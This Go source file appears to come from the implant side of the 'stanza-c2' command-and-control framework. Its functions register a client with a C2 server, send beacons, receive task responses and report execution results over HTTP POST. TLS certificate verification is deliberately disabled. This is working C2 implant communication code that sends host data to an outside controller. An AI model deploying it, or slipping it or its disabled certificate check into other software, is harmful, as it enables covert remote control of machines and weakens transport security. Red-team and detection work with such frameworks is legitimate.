package main

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/jmpsec/stanza-c2/pkg/types"
)

// Function to send a beacon to the C2 using HTTP
func sendHTTPBeacon(url string, data types.StzBeaconStatus) ([]types.StzBeaconResponse, error) {
	headers := map[string]string{
		"Content-Type": "application/json",
		"X-STZ-Verify": "Beacon",
	}
	jsonOut, err := json.Marshal(data)
	if err != nil {
		return []types.StzBeaconResponse{}, err
	}
	jsonParam := strings.NewReader(string(jsonOut))
	resp, body, err := sendHTTPRequest("POST", url, jsonParam, headers)
	if resp != http.StatusOK {
		return []types.StzBeaconResponse{}, errors.New("HTTP " + strconv.Itoa(resp) + ":" + string(body))
	}
	if err != nil {
		return []types.StzBeaconResponse{}, err
	}
	// Parse response
	var rData []types.StzBeaconResponse
	err = json.Unmarshal(body, &rData)
	if err != nil {
		return []types.StzBeaconResponse{}, err
	}
	return rData, nil
}

// Function to register a client in the C2 using HTTP
func registerHTTPClient(url string, data *types.StzRegistrationRequest) (types.StzRegistrationResponse, error) {
	headers := map[string]string{
		"Content-Type": "application/json",
		"X-STZ-Verify": "Registration",
	}
	jsonOut, err := json.Marshal(data)
	if err != nil {
		return types.StzRegistrationResponse{}, err
	}
	jsonParam := strings.NewReader(string(jsonOut))
	resp, body, err := sendHTTPRequest("POST", url, jsonParam, headers)
	if resp != http.StatusOK {
		return types.StzRegistrationResponse{}, fmt.Errorf("ERROR: HTTP %d - [%s]", resp, body)
	}
	if err != nil {
		return types.StzRegistrationResponse{}, err
	}
	// Parse response
	var rData types.StzRegistrationResponse
	err = json.Unmarshal(body, &rData)
	if err != nil {
		return types.StzRegistrationResponse{}, err
	}
	return rData, nil
}

// Function to send an execution status to the C2 using HTTP
func sendHTTPExecution(url string, data types.StzExecutionStatus) error {
	headers := map[string]string{
		"Content-Type": "application/json",
		"X-STZ-Verify": "Execution",
	}
	jsonOut, err := json.Marshal(data)
	if err != nil {
		return err
	}
	jsonParam := strings.NewReader(string(jsonOut))
	resp, body, err := sendHTTPRequest("POST", url, jsonParam, headers)
	if resp != http.StatusOK {
		return fmt.Errorf("ERROR: HTTP %d - [%s]", resp, body)
	}
	if err != nil {
		return err
	}

	return nil
}

// Standard function to send HTTP requests
func sendHTTPRequest(reqType, url string, params io.Reader, headers map[string]string) (int, []byte, error) {
	tr := &http.Transport{}
	if strings.HasPrefix(url, "https://") {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	timeout := 2 * time.Second
	client := &http.Client{
		Timeout:   timeout,
		Transport: tr,
	}
	req, err := http.NewRequest(reqType, url, params)
	if err != nil {
		return 0, []byte("Cound not prepare request"), err
	}
	// Prepare headers
	for key, value := range headers {
		req.Header.Add(key, value)
	}
	// Send request
	if printDebug {
		log.Printf("STZ_DEBUG: %s %s\n", reqType, url)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, []byte("Error sending request"), err
	}
	defer func() {
		err := resp.Body.Close()
		if err != nil {
			log.Fatalf("Failed to close response Body %v", err)
		}
	}()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, []byte("Can not read response"), err
	}
	if printDebug {
		log.Printf("STZ_DEBUG: Response body [ %s ]\n", string(bodyBytes))
	}
	return resp.StatusCode, bodyBytes, nil
}
